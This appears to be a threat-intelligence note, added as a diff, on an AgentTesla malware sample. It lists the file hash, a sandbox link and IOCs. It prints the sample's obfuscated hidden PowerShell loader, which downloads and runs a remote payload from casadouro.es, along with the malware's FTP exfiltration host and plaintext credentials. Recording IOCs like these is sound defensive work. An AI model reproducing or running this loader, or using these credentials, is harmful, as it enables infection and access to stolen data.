@@ -1,0 +1,56 @@
+AgentTesla | 2022.08.31
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.chm a6df8130c05b9eef70ae1a9fe678b97e7b1d343be1d677dbe390e2ae3afc9245
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/220831-pp1hcap1tq/behavioral2
+
+
+# --------------------------------------------------------- #
+# ---------------------- CREDENTIAL ----------------------- #
+# --------------------------------------------------------- #
+Protocol:ftp
+Host:ftp://mfaraday.com/
+Port:21
+Username:rbstub@mfaraday.com
+Password:BDEu&4xo@8SA
+
+# --------------------------------------------------------- #
+# --------------------- DEOBFUSCATED ---------------------- #
+# --------------------------------------------------------- #
+t0 = "IEx"
+set-alias p "IEx"
+"Continue" = "SilentlyContinue"
+$t56fg = 
+(toobject, [system.net.securityprotocoltype], 3072)
+[system.net.servicepointmanager]::securityprotocol = $t56fg
+"[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')"|invoke-expression
+({$ping = test-connection -comp google.com -count 1 -quiet   "", $tty = "(New-Object Net.WebClient)"|invoke-expression, $mv = $tty.downloadstring("https://casadouro.es/tech.txt")|invoke-expression})
+# powershell snippet 1
+[void][system.reflection.assembly]::loadwithpartialname("Microsoft.VisualBasic")
+# powershell snippet 2
+new-object net.webclient
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+C:\Windows\hh.exe
+"C:\Windows\hh.exe" C:\Users\Admin\AppData\Local\Temp\REMITTAN.chm
+
+    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden $t0='DE5'.replace('D','I').replace('5','x');sal P $t0;$ErrorActionPreference = 'SilentlyContinue';$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;'[void' + '] [Syst' + 'em.Refle' + 'ction.Asse' + 'mbly]::LoadWi' + 'thPartialName(''Microsoft.VisualBasic'')'|P;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$tty='(New-'+'Obje'+'ct Ne'+'t.We'+'bCli'+'ent)'|P;$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'Down' + 'load' + 'Str' + 'ing',[Microsoft.VisualBasic.CallType]::Method,'https' + '://casadouro.es/tech.txt')|P
+
+        C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+        "C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+
+
+# --------------------------------------------------------- #
+# -------------------------- URL -------------------------- #
+# --------------------------------------------------------- #
+https://casadouro.es/tech.txt
